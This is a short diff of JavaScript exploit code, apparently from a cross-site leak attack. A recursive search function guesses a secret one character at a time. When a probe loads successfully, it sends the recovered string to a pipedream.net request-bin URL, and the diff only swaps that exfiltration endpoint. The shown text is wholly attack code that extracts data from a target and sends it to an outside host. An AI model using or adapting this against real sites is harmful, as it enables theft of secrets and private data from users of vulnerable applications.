@@ -16,7 +16,7 @@ function search(leak, charCounter) {
     console.log("TRY: " + leak + curChar);
     x.onload = () => {
         leak += curChar
-        fetch("https://eoshhfon99qb65i.m.pipedream.net/" + leak)
+        fetch("https://eo4y4b3vwkxx31o.m.pipedream.net/" + leak)
         search(leak, 0);
     }
     x.onerror = () => {
